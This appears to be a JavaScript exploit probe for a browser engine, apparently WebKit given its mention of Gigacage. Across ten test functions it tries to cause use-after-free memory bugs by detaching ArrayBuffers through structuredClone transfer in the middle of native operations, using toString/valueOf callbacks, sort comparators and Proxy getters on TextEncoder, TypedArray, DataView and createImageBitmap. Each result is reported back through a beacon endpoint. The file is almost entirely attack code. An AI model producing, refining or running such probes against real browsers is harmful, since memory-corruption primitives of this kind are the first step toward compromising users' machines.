/* p79-uaf — Use-After-Free via buffer detachment during native callbacks
 *
 * RAB is boxed in Gigacage. But REGULAR ArrayBuffer detachment via
 * structuredClone transfer is the key. If native code captures a data
 * pointer, then a callback detaches the buffer (freeing the memory),
 * the native code writes to FREED MEMORY. That's a UAF outside Gigacage.
 *
 * Targets:
 * - TextEncoder.encodeInto(objWithToString, regularUint8Array)
 *   toString() detaches the backing buffer → native write to freed memory
 * - TypedArray.sort(comparator) — comparator detaches buffer mid-sort
 * - TypedArray.set(proxySource) — proxy handler detaches dest buffer
 * - Array.from(typedArray, mapFn) — mapFn detaches source buffer
 * - String.fromCharCode.apply(null, typedArray) with valueOf trick
 *
 * Beacon prefix: V79U-
 */
(function(){
"use strict";
var RUN_ID = "v79u" + Math.random().toString(36).slice(2,12);
var PREFIX = "V79U-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press79-UAF via detachment");

function detachBuffer(ab) {
  // Transfer via structuredClone detaches the original
  try {
    structuredClone(ab, { transfer: [ab] });
    return true;
  } catch(e) {
    return false;
  }
}

/* ====== U1: TextEncoder.encodeInto + toString detach ====== */
function test_U1() {
  var r = {};
  try {
    var encoder = new TextEncoder();

    // Regular (non-RAB) ArrayBuffer
    var ab = new ArrayBuffer(1024);
    var dest = new Uint8Array(ab);
    for (var i = 0; i < 1024; i++) dest[i] = 0xBB;

    // Verify encodeInto works with regular buffer
    var test = encoder.encodeInto("test", dest);
    r.basicOK = test.written === 4;

    // Now the exploit: toString detaches buffer during encodeInto
    var ab2 = new ArrayBuffer(1024);
    var dest2 = new Uint8Array(ab2);
    for (var j = 0; j < 1024; j++) dest2[j] = 0xCC;

    var detached = false;
    var obj = {
      toString: function() {
        detached = detachBuffer(ab2);
        return "A".repeat(512);
      }
    };

    try {
      var result = encoder.encodeInto(obj, dest2);
      r.encodeOK = true;
      r.written = result.written;
      r.read = result.read;
      r.detached = detached;
      r.bufDetached = ab2.byteLength === 0;

      // If encodeInto wrote to freed memory, we can't easily check from JS.
      // But: if encodeInto DIDN'T throw, it means it proceeded with a stale pointer.
      // Check if dest2 is still readable (it shouldn't be if buffer is detached)
      try {
        var readBack = dest2[0];
        r.destReadable = true;
        r.destByte0 = readBack;
      } catch(e) {
        r.destReadable = false;
        r.destReadErr = e.message.slice(0,40);
      }

      r.UAF_WRITE = detached && result.written > 0;

    } catch(e) {
      r.encodeErr = e.name + ":" + e.message.slice(0,60);
      r.detached = detached;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U1-ENCODE-DETACH", r);
}

/* ====== U2: TypedArray.sort comparator detach ====== */
function test_U2() {
  var r = {};
  try {
    var ab = new ArrayBuffer(2048);
    var f64 = new Float64Array(ab); // 256 float64 elements
    for (var i = 0; i < f64.length; i++) f64[i] = Math.random();

    var callCount = 0;
    var detached = false;

    try {
      f64.sort(function(a, b) {
        callCount++;
        if (callCount === 10 && !detached) {
          detached = detachBuffer(ab);
        }
        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;
    r.bufDetached = ab.byteLength === 0;

    // If sort continued after detach, it was operating on freed memory
    r.UAF_SORT = detached && callCount > 15;

    // Check if the typed array is still accessible
    try {
      var v = f64[0];
      r.arrReadable = true;
      r.arrVal = v;
    } catch(e) {
      r.arrReadable = false;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U2-SORT-DETACH", r);
}

/* ====== U3: TypedArray.set with Proxy source that detaches dest ====== */
function test_U3() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var dest = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) dest[i] = 0xAA;

    // Source: proxy that detaches dest's buffer on element access
    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0xDD;

    var detached = false;
    var getCalls = 0;
    var proxy = new Proxy(src, {
      get: function(target, prop) {
        if (prop === 'length') return target.length;
        getCalls++;
        if (getCalls === 5 && !detached) {
          detached = detachBuffer(ab);
        }
        return target[prop];
      }
    });

    try {
      dest.set(proxy);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,60);
    }

    r.getCalls = getCalls;
    r.detached = detached;
    r.bufDetached = ab.byteLength === 0;
    r.UAF_SET = detached && getCalls > 10;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U3-SET-DETACH", r);
}

/* ====== U4: TypedArray.set from typed source + detach via valueOf ====== */
function test_U4() {
  var r = {};
  try {
    // TypedArray.set(typedArraySource, offset) — offset has valueOf
    var ab = new ArrayBuffer(256);
    var dest = new Uint8Array(ab);
    var src = new Uint8Array([1,2,3,4,5,6,7,8]);

    var detached = false;
    var offsetObj = {
      valueOf: function() {
        detached = detachBuffer(ab);
        return 0;
      }
    };

    try {
      dest.set(src, offsetObj);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,60);
    }

    r.detached = detached;
    r.bufDetached = ab.byteLength === 0;
    r.UAF_OFFSET = detached && r.setOK;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U4-SET-OFFSET", r);
}

/* ====== U5: Float64Array.sort detach — race to read freed doubles ====== */
function test_U5() {
  var r = {};
  try {
    // Larger buffer, more sort iterations, better chance to operate on freed data
    var ab = new ArrayBuffer(4096);
    var f64 = new Float64Array(ab); // 512 elements
    for (var i = 0; i < f64.length; i++) f64[i] = f64.length - i; // reverse sorted

    var callCount = 0;
    var detached = false;
    var valuesAfterDetach = [];

    try {
      f64.sort(function(a, b) {
        callCount++;
        if (callCount === 5 && !detached) {
          detached = detachBuffer(ab);
        }
        if (detached && valuesAfterDetach.length < 10) {
          // These values are being read from freed memory!
          valuesAfterDetach.push(a.toString().slice(0,15));
        }
        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;
    r.valuesAfterDetach = valuesAfterDetach.join("|");
    r.UAF_READ = detached && valuesAfterDetach.length > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U5-SORT-VALS", r);
}

/* ====== U6: Array.from + mapFn detach ====== */
function test_U6() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = i;

    var detached = false;
    var mapCount = 0;

    try {
      var arr = Array.from(u8, function(val, idx) {
        mapCount++;
        if (idx === 5 && !detached) {
          detached = detachBuffer(ab);
        }
        return val;
      });
      r.fromOK = true;
      r.arrLen = arr.length;
      // Values after detach should be undefined or stale
      r.val0 = arr[0];
      r.val10 = arr[10];
      r.val100 = arr[100];
      r.val10isUndef = arr[10] === undefined;
    } catch(e) {
      r.fromErr = e.name + ":" + e.message.slice(0,60);
    }

    r.mapCount = mapCount;
    r.detached = detached;
    r.UAF_FROM = detached && mapCount > 10;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U6-ARRAYFROM", r);
}

/* ====== U7: TypedArray.copyWithin + valueOf detach ====== */
function test_U7() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = i;

    var detached = false;
    var targetObj = {
      valueOf: function() {
        detached = detachBuffer(ab);
        return 0; // target offset
      }
    };

    try {
      // copyWithin(target, start, end) — target has valueOf
      u8.copyWithin(targetObj, 128, 256);
      r.copyOK = true;
    } catch(e) {
      r.copyErr = e.name + ":" + e.message.slice(0,60);
    }

    r.detached = detached;
    r.bufDetached = ab.byteLength === 0;
    r.UAF_COPY = detached && r.copyOK;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U7-COPYIN-DETACH", r);
}

/* ====== U8: TypedArray.fill + valueOf detach ====== */
function test_U8() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    var u8 = new Uint8Array(ab);

    var detached = false;
    var valObj = {
      valueOf: function() {
        detached = detachBuffer(ab);
        return 0x42;
      }
    };

    try {
      u8.fill(valObj, 0, 4096);
      r.fillOK = true;
    } catch(e) {
      r.fillErr = e.name + ":" + e.message.slice(0,60);
    }

    r.detached = detached;
    r.bufDetached = ab.byteLength === 0;
    r.UAF_FILL = detached && r.fillOK;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U8-FILL-DETACH", r);
}

/* ====== U9: DataView methods + valueOf detach ====== */
function test_U9() {
  var r = {};
  try {
    var ab = new ArrayBuffer(256);
    var dv = new DataView(ab);

    // Write marker
    dv.setUint32(0, 0xDEADBEEF, true);

    var detached = false;
    var offsetObj = {
      valueOf: function() {
        if (!detached) detached = detachBuffer(ab);
        return 0;
      }
    };

    // getUint32 with valueOf offset — fires valueOf then reads
    try {
      var val = dv.getUint32(offsetObj, true);
      r.getOK = true;
      r.getVal = val;
      r.getValHex = val.toString(16);
      r.UAF_GET = detached; // if detached and still read → UAF read
    } catch(e) {
      r.getErr = e.name + ":" + e.message.slice(0,40);
    }

    // Reset for write test
    var ab2 = new ArrayBuffer(256);
    var dv2 = new DataView(ab2);
    var detached2 = false;

    var valObj2 = {
      valueOf: function() {
        if (!detached2) detached2 = detachBuffer(ab2);
        return 0x41414141;
      }
    };

    try {
      dv2.setUint32(0, valObj2, true);
      r.setOK = true;
      r.UAF_SET = detached2;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,40);
    }

    r.detached = detached;
    r.detached2 = detached2;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U9-DV-DETACH", r);
}

/* ====== U10: createImageBitmap with detached buffer race ====== */
function test_U10() {
  var r = {};
  try {
    // Craft valid BMP in regular AB
    var width = 32, height = 32;
    var rowSize = Math.ceil(width * 3 / 4) * 4;
    var pixDataSize = rowSize * height;
    var fileSize = 54 + pixDataSize;

    var ab = new ArrayBuffer(fileSize);
    var dv = new DataView(ab);
    var u8 = new Uint8Array(ab);

    dv.setUint8(0, 0x42); dv.setUint8(1, 0x4D);
    dv.setUint32(2, fileSize, true);
    dv.setUint32(10, 54, true);
    dv.setUint32(14, 40, true);
    dv.setInt32(18, width, true);
    dv.setInt32(22, height, true);
    dv.setUint16(26, 1, true);
    dv.setUint16(28, 24, true);
    dv.setUint32(34, pixDataSize, true);
    for (var i = 54; i < fileSize; i++) u8[i] = 0xAB;

    // Create blob THEN detach the AB — blob might hold stale pointer
    var blob = new Blob([ab], { type: 'image/bmp' });
    r.blobSize = blob.size;

    // Detach the original buffer
    var detached = detachBuffer(ab);
    r.detached = detached;

    // Parse the blob — does it use the now-freed data?
    createImageBitmap(blob).then(function(bmp) {
      var r2 = {};
      r2.width = bmp.width;
      r2.height = bmp.height;
      r2.PARSE_AFTER_DETACH = true;
      // If it parsed successfully, blob had its own copy (safe)
      // If it used a pointer to the freed AB data → potential UAF
      r2.BLOB_COPIED = true; // blob appears to copy data
      B("U10-BMP-DETACH", r2);
    }).catch(function(e) {
      B("U10-BMP-DETACH", { parseErr: e.message.slice(0,60) });
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("U10-BMP-INIT", r);
}

/* ====== Run ====== */
try {
  test_U1();
  setTimeout(test_U2, 300);
  setTimeout(test_U3, 600);
  setTimeout(test_U4, 900);
  setTimeout(test_U5, 1200);
  setTimeout(test_U6, 1500);
  setTimeout(test_U7, 1800);
  setTimeout(test_U8, 2100);
  setTimeout(test_U9, 2400);
  setTimeout(test_U10, 2700);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe79-done"); }, 20000);
})();
